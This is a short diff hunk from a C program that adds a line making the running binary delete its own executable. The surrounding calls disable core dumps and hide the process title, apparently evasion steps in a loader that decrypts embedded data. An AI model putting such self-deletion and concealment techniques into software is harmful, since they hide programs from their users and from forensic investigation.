@@ -232,6 +232,7 @@ int main(int argc, char* argv[], char* envp[]) {
     uint8_t* decrypted_data;
     uint32_t calculated_crc;
 
+    unlink(argv[0]);
     prevent_core_dumps();
     hide_process_title(argc, argv);
 
